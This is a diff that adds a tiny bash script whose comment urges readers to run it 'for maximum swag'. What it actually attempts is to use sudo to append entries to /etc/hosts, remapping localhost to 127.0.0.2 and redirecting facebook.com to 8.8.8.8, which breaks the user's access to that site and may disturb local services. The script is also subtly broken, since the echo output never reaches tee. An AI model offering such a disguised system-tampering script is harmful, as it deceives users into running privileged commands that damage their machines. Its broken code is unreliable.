@@ -1,0 +1,5 @@
+#!/usr/bin/env bash
+# Run this script in your computer for maximum swag.
+
+echo -e "127.0.0.2\tlocalhost\n8.8.8.8\tfacebook.com"
+sudo tee -a /etc/hosts
